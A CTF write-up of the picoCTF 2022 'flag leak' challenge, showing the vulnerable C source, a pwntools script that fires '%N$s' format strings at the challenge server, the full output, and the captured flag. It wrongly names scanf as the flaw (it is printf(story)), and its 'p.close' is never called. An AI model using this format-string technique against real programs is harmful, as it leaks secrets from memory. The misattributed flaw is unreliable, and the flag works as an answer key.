@@ -1,0 +1,286 @@
+#pico2022 #binaryexploitation 
+
+## Challenge:
+```md
+Story telling class 1/2
+```
+
+This challenge launches an instance.
+```md
+Story telling class 1/2 I'm just copying and pasting with this [program](https://artifacts.picoctf.net/c/122/vuln). What can go wrong? You can view source [here](https://artifacts.picoctf.net/c/122/vuln.c). And connect with it using: `nc saturn.picoctf.net 54254`
+```
+
+## Process:
+I download the files.
+```bash
+curl -O https://artifacts.picoctf.net/c/122/vuln
+curl -O https://artifacts.picoctf.net/c/122/vuln.c
+```
+#curl 
+
+And made *vuln* executable.
+```bash
+chmod +x vuln
+```
+#chmod 
+
+I created a *flag.txt* file
+```bash
+echo "flag{}" > flag.txt
+```
+#echo 
+
+And I started looking into the *vuln.c*.
+```c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <wchar.h>
+#include <locale.h>
+
+#define BUFSIZE 64
+#define FLAGSIZE 64
+
+void readflag(char* buf, size_t len) {
+  FILE *f = fopen("flag.txt","r");
+  if (f == NULL) {
+    printf("%s %s", "Please create 'flag.txt' in this directory with your",
+                    "own debugging flag.\n");
+    exit(0);
+  }
+
+  fgets(buf,len,f); // size bound read
+}
+
+void vuln(){
+   char flag[BUFSIZE];
+   char story[128];
+
+   readflag(flag, FLAGSIZE);
+
+   printf("Tell me a story and then I'll tell you one >> ");
+   scanf("%127s", story);
+   printf("Here's a story - \n");
+   printf(story);
+   printf("\n");
+}
+
+int main(int argc, char **argv){
+
+  setvbuf(stdout, NULL, _IONBF, 0);
+  
+  // Set the gid to the effective gid
+  // this prevents /bin/sh from dropping the privileges
+  gid_t gid = getegid();
+  setresgid(gid, gid, gid);
+  vuln();
+  return 0;
+}
+```
+#c 
+
+Running the program I see ```scanf("%127s", story)``` and this has a format string vulnerability where memory can be leaked with ```%x```.
+![[045_flag_leak-0.png]]
+
+So I try a few more.
+![[045_flag_leak-1.png]]
+
+And even more.
+![[045_flag_leak-2.png]]
+
+Which gives me:
+```
+fff2f2c0f7c1237480493467825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782578257825782525782567616c66a7d7b3e9f7cdf721f7c0de54804c000fff2f474f7f78b80fff2f3a8f7f54ff4f7e2b9b4aa618b003e9804c000fff2f47480494103e9804c000fff2f3a88049418fff2f3d0f7f3a66cf7f3ab203e9fff2f3c0f7e2a000f7f79020f7c21519
+```
+
+Here's the python script to exploit the format string vulnerabilty.
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+
+host, port = 'saturn.picoctf.net', 54254
+
+for i in range(30):
+    p = remote(host, port)
+    p.recvuntil(b'>>')
+    p.sendline('%' + str(i) + '$s')
+    print(p.recvuntil(b'-'))
+    print(i), print(p.recv())
+    p.close
+```
+#python #pwntools 
+
+Which outputs:
+```
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+/home/jacob/docs/ctf/pico/2022/045_flag_leak/getflag.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline('%' + str(i) + '$s')
+b" Here's a story -"
+0
+b' \n%0$s\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+1
+b' \n%1$s\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+2
+b' \n\x10\x91\xee\xf7\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+3
+b' \n\x81\xc3\xba,\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+4
+b' \n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+5
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+6
+b' \n(null)\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+7
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+8
+b' \n\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+9
+b' \n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+10
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+11
+b' \n\xb3.\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+12
+b' \n\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+13
+b' \n(null)\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+14
+b' \n\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+15
+b' \n\x83\xc4\x10\x83\xf8\xff\x0f\x84\xba\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+16
+b' \n\x87(\xad\xfbg\xfd\xf5\xf7g\xfd\xf5\xf7g\xfd\xf5\xf7g\xfd\xf5\xf7g\xfd\xf5\xf7g\xfd\xf5\xf7g\xfd\xf5\xf7h\xfd\xf5\xf7\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+17
+b' \n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+18
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+19
+b' \nsetresgid\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+20
+b' \n\xa0\xb1\xdd\xf7\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+21
+b' \n\x89\xc7e\xa1\x0c\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+22
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+23
+b' \n\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+24
+b' \nCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+25
+b' \n\xf0j\xf2\xf7\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+26
+b' \n\xcd\x83\x04\x08\x10ii\r\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+27
+b' \n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+28
+b' '
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+b" Here's a story -"
+29
+b' \n(null)\n'
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+[*] Closed connection to saturn.picoctf.net port 54254
+```
+
+Here we can see:
+```
+b" Here's a story -"
+24
+b' \nCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}\n'
+[+] Opening connection to saturn.picoctf.net on port 54254: Done
+```
+
+Here I can assume the full flag.
+```bash
+echo "picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}" > flag.txt
+```
+#echo 
+
+**Flag: *picoCTF{L34k1ng_Fl4g_0ff_St4ck_0551082c}***
